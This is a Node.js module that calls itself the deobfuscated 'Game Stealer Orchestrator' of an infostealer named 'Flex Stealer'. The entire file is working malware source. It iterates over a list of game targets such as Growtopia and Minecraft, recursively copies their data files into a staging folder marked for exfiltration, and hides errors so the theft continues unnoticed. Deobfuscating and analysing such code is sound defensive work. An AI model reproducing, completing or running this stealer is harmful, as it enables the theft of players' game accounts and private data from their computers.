/**
 * Deobfuscated Game Stealer Orchestrator
 * Part of "Flex Stealer | 2026"
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const { getPaths } = require('./gamePaths');

/**
 * Recursively copies a directory or file.
 * Used to stage stolen game data for exfiltration.
 */
function recursiveCopy(src, dest) {
    try {
        if (!fs.existsSync(src)) return false;
        
        const stats = fs.statSync(src);
        if (stats.isDirectory()) {
            if (!fs.existsSync(dest)) fs.mkdirSync(dest, { recursive: true });
            const files = fs.readdirSync(src);
            for (const file of files) {
                recursiveCopy(path.join(src, file), path.join(dest, file));
            }
        } else {
            const destDir = path.dirname(dest);
            if (!fs.existsSync(destDir)) fs.mkdirSync(destDir, { recursive: true });
            fs.copyFileSync(src, dest);
        }
        return true;
    } catch (err) {
        return false;
    }
}

/**
 * Main module execution function.
 * Iterates through all games defined in gamePaths and harvests their data.
 */
async function run(destinationBaseDir) {
    const gamesStagingDir = path.join(destinationBaseDir, "Games");
    let totalGamesFound = 0;
    const collectedGames = [];

    try {
        const gameTargets = getPaths();
        
        // Iterate through each game target (Growtopia, Minecraft, etc.)
        for (const [gameName, config] of Object.entries(gameTargets)) {
            let gameFound = false;
            const gameDestDir = path.join(gamesStagingDir, gameName);

            // Check if any of the target files for this game exist
            for (const targetFile of config.files) {
                const fullSrcPath = path.join(config.path, targetFile);
                const fullDestPath = path.join(gameDestDir, targetFile);

                if (fs.existsSync(fullSrcPath)) {
                    if (recursiveCopy(fullSrcPath, fullDestPath)) {
                        gameFound = true;
                    }
                }
            }

            if (gameFound) {
                totalGamesFound++;
                collectedGames.push(gameName);
            }
        }

        return {
            count: totalGamesFound,
            games: collectedGames
        };

    } catch (err) {
        // Silently handle errors to prevent script termination
        return {
            count: 0,
            games: []
        };
    }
}

module.exports = {
    run: run
};